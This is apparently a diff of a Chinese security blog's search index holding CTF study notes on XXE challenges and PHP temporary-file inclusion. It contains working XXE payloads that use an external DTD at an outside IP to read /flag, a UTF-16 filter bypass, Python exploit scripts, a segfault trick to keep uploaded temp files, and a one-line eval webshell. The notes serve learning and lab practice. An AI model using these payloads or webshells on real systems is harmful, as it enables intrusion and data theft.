class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br></pre></td></tr></table></figure>
+
+<p>与上题的区别是多了如下代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>相当于是不能出现 <code>&lt;?xml version=&quot;1.0&quot;</code> 和 <code>http</code> 及其大小写</p>
+<p>我们先看一下原 payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://81.71.4.233:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>有一个 <code>encoding=&quot;UTF-8&quot;</code> 的参数，那么我们就可以考虑除了 UTF-8 以外的其他编码，可以从 <a href="https://www.runoob.com/xml/xml-encoding.html">XML 编码 | 菜鸟教程 (runoob.com)</a> 中查看。</p>
+<p>那我们取其中一个试试看：</p>
+<p>先写一个编码转换的脚本（转 Unicode）：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">utf8_str = <span class="built_in">input</span>(<span class="string">&quot;utf-8:&quot;</span>)</span><br><span class="line"></span><br><span class="line">unicode_str = utf8_str.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Unicode:&quot;</span>, unicode_str)</span><br></pre></td></tr></table></figure>
+
+<p>编码后为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\xff\xfe&lt;\x00?\x00x\x00m\x00l\x00 \x00v\x00e\x00r\x00s\x00i\x00o\x00n\x00=\x00&quot;\x001\x00.\x000\x00&quot;\x00 \x00e\x00n\x00c\x00o\x00d\x00i\x00n\x00g\x00=\x00&quot;\x00U\x00T\x00F\x00-\x008\x00&quot;\x00?\x00&gt;\x00\n\x00\n\x00&lt;\x00!\x00D\x00O\x00C\x00T\x00Y\x00P\x00E\x00 \x00t\x00e\x00s\x00t\x00 \x00[\x00\n\x00&lt;\x00!\x00E\x00N\x00T\x00I\x00T\x00Y\x00 \x00%\x00 \x00f\x00i\x00l\x00e\x00 \x00S\x00Y\x00S\x00T\x00E\x00M\x00 \x00&quot;\x00p\x00h\x00p\x00:\x00/\x00/\x00f\x00i\x00l\x00t\x00e\x00r\x00/\x00r\x00e\x00a\x00d\x00=\x00c\x00o\x00n\x00v\x00e\x00r\x00t\x00.\x00b\x00a\x00s\x00e\x006\x004\x00-\x00e\x00n\x00c\x00o\x00d\x00e\x00/\x00r\x00e\x00s\x00o\x00u\x00r\x00c\x00e\x00=\x00/\x00f\x00l\x00a\x00g\x00&quot;\x00&gt;\x00\n\x00&lt;\x00!\x00E\x00N\x00T\x00I\x00T\x00Y\x00 \x00%\x00 \x00d\x00t\x00d\x00 \x00S\x00Y\x00S\x00T\x00E\x00M\x00 \x00&quot;\x00h\x00t\x00t\x00p\x00:\x00/\x00/\x00v\x00p\x00s\x00-\x00i\x00p\x00:\x008\x000\x000\x000\x00/\x00X\x00X\x00E\x00.\x00d\x00t\x00d\x00&quot;\x00&gt;\x00\n\x00%\x00d\x00t\x00d\x00;\x00\n\x00]\x00&gt;\x00\n\x00&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>但是直接放 Burp 里传不知道为什么成功不了</p>
+<p>试了 python 爬虫倒是成功了：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://819c130f-b2e1-4626-b9f8-8326d5ececbc.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%dtd;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">data = data.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line">res = requests.post(url=url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/04/02/VPGSAM5s4NgQUeb.png" alt="image-20240402200146457"></p>
+<h1 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h1><p>f12 发现可疑代码：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&#x27;text/javascript&#x27;</span>&gt;</span><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">doLogin</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> username = $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> password = $(<span class="string">&quot;#password&quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">if</span>(username == <span class="string">&quot;&quot;</span> || password == <span class="string">&quot;&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">alert</span>(<span class="string">&quot;Please enter the username and password!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> data = <span class="string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">    $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">url</span>: <span class="string">&quot;doLogin&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">contentType</span>: <span class="string">&quot;application/xml;charset=utf-8&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: data,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">dataType</span>: <span class="string">&quot;xml&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">anysc</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">result</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        	<span class="keyword">var</span> code = result.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;code&quot;</span>)[<span class="number">0</span>].<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">nodeValue</span>;</span></span><br><span class="line"><span class="language-javascript">        	<span class="keyword">var</span> msg = result.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;msg&quot;</span>)[<span class="number">0</span>].<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">nodeValue</span>;</span></span><br><span class="line"><span class="language-javascript">        	<span class="keyword">if</span>(code == <span class="string">&quot;0&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(msg + <span class="string">&quot; login fail!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="string">&quot;1&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(msg + <span class="string">&quot; login success!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        	&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(<span class="string">&quot;error:&quot;</span> + msg);</span></span><br><span class="line"><span class="language-javascript">        	&#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">XMLHttpRequest,textStatus,errorThrown</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            $(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(errorThrown + <span class="string">&#x27;:&#x27;</span> + textStatus);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;); </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这段代码是一个 JavaScript 函数，名为<code>doLogin()</code>，它执行用户登录的操作。具体功能如下：</p>
+<ol>
+<li><p>获取用户输入的用户名和密码：</p>
+<ul>
+<li>通过<code>$(&quot;#username&quot;).val()</code>获取用户名输入框的值，存储在变量<code>username</code>中。</li>
+<li>通过<code>$(&quot;#password&quot;).val()</code>获取密码输入框的值，存储在变量<code>password</code>中。</li>
+</ul>
+</li>
+<li><p>检查用户名和密码是否为空：</p>
+<ul>
+<li>如果用户名或密码为空，则弹出警告框提示用户输入用户名和密码，并返回，不继续执行登录操作。</li>
+</ul>
+</li>
+<li><p>构建XML格式的数据：</p>
+<ul>
+<li>使用用户输入的用户名和密码构建一个XML格式的字符串，如<code>&lt;user&gt;&lt;username&gt;user123&lt;/username&gt;&lt;password&gt;pass123&lt;/password&gt;&lt;/user&gt;</code>，存储在变量<code>data</code>中。</li>
+</ul>
+</li>
+<li><p>发送Ajax请求：</p>
+<ul>
+<li>使用<code>$.ajax()</code>方法发送 POST 请求到 URL 为 “doLogin”。</li>
+<li>设置请求头的内容类型为 XML ，编码为 UTF-8 。</li>
+<li>发送构建好的 XML 数据。</li>
+<li>期望响应的数据类型为 XML 。</li>
+<li>设置<code>anysc</code>为 false ，表示同步请求。</li>
+<li>定义请求成功的回调函数和请求失败的回调函数。</li>
+</ul>
+</li>
+<li><p>处理响应：</p>
+<ul>
+<li>如果请求成功，从响应中提取<code>code</code>和<code>msg</code>，根据<code>code</code>的值显示不同的消息在页面上。</li>
+<li>如果请求失败，显示错误消息在页面上。</li>
+</ul>
+</li>
+</ol>
+<p>显然又是 XXE，输入 admin&#x2F;admin 后看他发送的包更加明了一些：</p>
+<p><img src="https://s2.loli.net/2024/04/02/iFLAJzIahG9Olf5.png" alt="image-20240402201520838"></p>
+<p>payload 反而比前面几道简单：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">XEE</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">payload</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;payload;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;payload;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/04/02/OwET1C2ky7celi6.png" alt="image-20240402201914912"></p>
 ]]></content>
       <categories>
         <category>XXE</category>
@@ -3165,6 +3165,100 @@
       </tags>
   </entry>
   <entry>
+    <title>包含临时文件学习记录</title>
+    <url>/2024/03/09/%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<h1 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h1><h2 id="php文件上传特性"><a href="#php文件上传特性" class="headerlink" title="php文件上传特性"></a>php文件上传特性</h2><p><img src="https://s2.loli.net/2023/11/18/5AgRPFiqI4KeX3a.png" alt="img"></p>
+<span id="more"></span>
+
+<p>php中上传文件，会创建临时文件，随机生成临时文件名（临时文件名为<code>php+6位[a-zA-Z0-9]</code>，比如<code>phpkx32ma</code>），将上传的内容写入临时文件后，关闭临时文件。在<code>linux</code>下保存在<code>/tmp</code>目录，而在<code>windows</code>下保存在<code>c:\winsdows\temp</code>目录。然后开始执行文件内程序，执行完后删除。因此，可以上传包含payload的恶意文件，在文件被删除前（作为临时文件）包含该文件，可以实现利用。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">    <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>配合<code>phpinfo</code>页面的<code>php variables</code>，可以直接获取到上传文件的存储路径和临时文件名</p>
+<p><img src="https://s2.loli.net/2023/11/18/YWsGoH6aLJiC2Uc.png" alt="image-20231025142053342"></p>
+<h2 id="包含方式"><a href="#包含方式" class="headerlink" title="包含方式"></a>包含方式</h2><p>临时文件转瞬即逝，如何在短时间内包含它？</p>
+<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>条件竞争就是一直上传文件，同时一直去包含临时文件，竞争一下是先包含还是先删除。</p>
+<h3 id="段错误"><a href="#段错误" class="headerlink" title="段错误"></a>段错误</h3><p>所谓的段错误（segment fault）就是指访问的内存超过了系统所给这个程序的内存空间。从而发生程序退出，临时文件就不会被删除。</p>
+<p>在php7中</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/string.strip_tags=/etc/passwd</span></span><br></pre></td></tr></table></figure>
+
+<p>会造成段错误。 </p>
+<p>适用版本： </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复</span><br><span class="line">php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复</span><br><span class="line">php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</span><br></pre></td></tr></table></figure>
+
+<h4 id="实列及详解"><a href="#实列及详解" class="headerlink" title="实列及详解"></a>实列及详解</h4><p>查看网页源代码，发现提示信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username/password error&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>传递name参数，用burp抓包并发送到repeater模块</p>
+<p><img src="https://s2.loli.net/2023/11/18/y9SgG3NDnjQacIB.png" alt="image-20231025161936687"></p>
+<p><img src="https://s2.loli.net/2023/11/18/oQL6JwPxvsfSk4a.png" alt="image-20231025161900649"></p>
+<p>经过测试，发现改变name的值，响应包中Hash值会响应改变（name和hash一一对应），结合提示，可以传入pass参数，值为响应包中的Hash值（name值和pass值要相对应）。</p>
+<p><img src="https://s2.loli.net/2023/11/18/IDOkeyP7MNYGdKZ.png" alt="image-20231025162123175"></p>
+<p>在响应包中发现提示文件：<code>flflflflag.php</code>，访问该文件</p>
+<p><img src="https://s2.loli.net/2023/11/18/mxInGt6O72psNyY.png" alt="image-20231025162404641"></p>
+<p>发现文件包含，猜测可能是文件包含漏洞，可以查看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=flflflflag.php</span><br></pre></td></tr></table></figure>
+
+<p>用BurpSuite拦截响应，base64解码后得到源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span><br><span class="line">           window.location.href=&quot;404.html&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123;</span><br><span class="line">	die(&#x27;nonono&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">echo &#x27;include($_GET[&quot;file&quot;])&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>利用目录扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://c7e65748-3412-4257-9224-6c01808f5a20.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>
+
+<p>扫描发现dir.php。</p>
+<p><img src="https://s2.loli.net/2023/11/18/ruxOEn2CovHcR5U.png" alt="image-20231025165147270"></p>
+<p><img src="https://s2.loli.net/2023/11/18/ULTyQMfe9zqj4VW.png" alt="image-20231025165242501"></p>
+<p>访问dir.php文件：</p>
+<p><img src="https://s2.loli.net/2023/11/18/o7rUlwePmHFVIqA.png" alt="image-20231025163132883"></p>
+<p>查看dir.php源代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=dir.php</span><br></pre></td></tr></table></figure>
+
+<p>用Burpsuite拦截响应，base64解码后源代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/tmp&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>dir.php能打印临时文件夹里的内容，因此我们要想办法把文件存到tmp文件夹中。</p>
+<p>该题存在文件包含，而且可以显示临时文件夹（&#x2F;tmp）的内容，因此可以考虑临时文件包含的方法解题。同时，根据响应包中内容：<code>X-Powered-By: PHP/7.0.33</code>，说明php版本存在段错误。</p>
+<p>编写python脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO </span><br><span class="line"><span class="comment">#BytesIO实现了在内存中读写bytes</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span> </span><br><span class="line"><span class="comment">#注入的恶意命令</span></span><br><span class="line"><span class="comment">#payload=&quot;&lt;?php echo 12;fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php echo 1234;eval($_POST[0]);?&gt;&#x27;);?&gt;&quot; </span></span><br><span class="line"><span class="comment">#把一句话木马写入shell.php</span></span><br><span class="line">data=&#123;<span class="string">&#x27;file&#x27;</span>: BytesIO(payload.encode())&#125;</span><br><span class="line">url=<span class="string">&quot;http://c7e65748-3412-4257-9224-6c01808f5a20.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">r=requests.post(url=url,files=data,allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p>执行该脚本后，payload就注入到临时文件了。</p>
+<p>再次访问dir.php文件，得到tmp目录下刚刚我们上传的文件路径：&#x2F;tmp&#x2F;phpVvvefu</p>
+<p><img src="https://s2.loli.net/2023/11/18/jymveQM7NRstuDc.png" alt="image-20231025164408642"></p>
+<p>利用BurpSuite发送请求，由于本题的flag在<code>phpinfo()</code>中，因此这样就能得到flag：</p>
+<p><img src="https://s2.loli.net/2023/11/18/d5BhRK1X6Tgta9m.png" alt="image-20231025164751449"></p>
+<h3 id="自包含"><a href="#自包含" class="headerlink" title="自包含"></a>自包含</h3><p>自己包含自己，进入死循环，脚本永不结束，也就不会删除临时文件。</p>
+<p>文件上传，phpinfo，自包含三者缺一不可，在同一个页面发生。</p>
+<p>题目源码（文件位于<code>index.php</code>）</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="string">&#x27;/var/www/html/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$page</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>如果将<code>page</code>赋值为<code>index.php</code>，就会开始自包含。</p>
+<p>然后对死循环发送POST请求，此时POST请求对应的临时文件才不会被清理。</p>
+<p>创建上传表单（<code>untitled.html</code>）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://url/?page=index.php&amp;info&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--action的值为目标服务器地址 --&gt; </span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>创建上传文件（<code>1.txt</code>）：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;123&#x27;</span>); </span><br><span class="line">    <span class="comment"># 123用于检查是否上传成功</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/shell.php&#x27;</span>, <span class="string">&#x27;&lt;?php echo(&#x27;</span><span class="number">1234</span><span class="string">&#x27;); eval($_POST[0]);?&gt;&#x27;</span>);</span><br><span class="line">    <span class="comment"># 1234用于检查是否执行成功</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意，如果循环次数过多会导致电脑死机，所以不建议长时间循环，最好的方式是包含后就生成一个永久的shell，一包含到就可以结束自包含。</p>
+<p>打开上传表单，并上传</p>
+<p>上传成功后找到路径</p>
+<p><img src="https://s2.loli.net/2023/11/18/uSEZL1jxi2TqfCM.png" alt="image-20231025195150883"></p>
+<p>包含</p>
+<p><img src="https://s2.loli.net/2024/04/02/pd4ScAFLP7ThWr6.png" alt="8hvtMaESITi7Jd4"></p>
+<p>输出 123 表示 1.txt 文件上传成功</p>
+<p>关闭循环，找到木马文件路径</p>
+<p><img src="https://s2.loli.net/2024/04/02/xgThuJoaliAfBV3.png" alt="nUJworM2IdKe4Eu"></p>
+<p>输出 1234 表示一句话木马执行成功。接下来连蚁剑，找 flag。</p>
+]]></content>
+      <categories>
+        <category>文件包含</category>
+      </categories>
+      <tags>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>文件包含学习记录</title>
     <url>/2024/03/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
     <content><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="认识是文件包含："><a href="#认识是文件包含：" class="headerlink" title="认识是文件包含："></a>认识是文件包含：</h2><p>通过<code>PHP</code>函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，就可能导致意外的文件泄漏甚至恶意代码注入。</p>
@@ -3370,100 +3464,6 @@
 
 
 
-]]></content>
-      <categories>
-        <category>文件包含</category>
-      </categories>
-      <tags>
-        <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>包含临时文件学习记录</title>
-    <url>/2024/03/09/%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<h1 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h1><h2 id="php文件上传特性"><a href="#php文件上传特性" class="headerlink" title="php文件上传特性"></a>php文件上传特性</h2><p><img src="https://s2.loli.net/2023/11/18/5AgRPFiqI4KeX3a.png" alt="img"></p>
-<span id="more"></span>
-
-<p>php中上传文件，会创建临时文件，随机生成临时文件名（临时文件名为<code>php+6位[a-zA-Z0-9]</code>，比如<code>phpkx32ma</code>），将上传的内容写入临时文件后，关闭临时文件。在<code>linux</code>下保存在<code>/tmp</code>目录，而在<code>windows</code>下保存在<code>c:\winsdows\temp</code>目录。然后开始执行文件内程序，执行完后删除。因此，可以上传包含payload的恶意文件，在文件被删除前（作为临时文件）包含该文件，可以实现利用。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">    <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>配合<code>phpinfo</code>页面的<code>php variables</code>，可以直接获取到上传文件的存储路径和临时文件名</p>
-<p><img src="https://s2.loli.net/2023/11/18/YWsGoH6aLJiC2Uc.png" alt="image-20231025142053342"></p>
-<h2 id="包含方式"><a href="#包含方式" class="headerlink" title="包含方式"></a>包含方式</h2><p>临时文件转瞬即逝，如何在短时间内包含它？</p>
-<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>条件竞争就是一直上传文件，同时一直去包含临时文件，竞争一下是先包含还是先删除。</p>
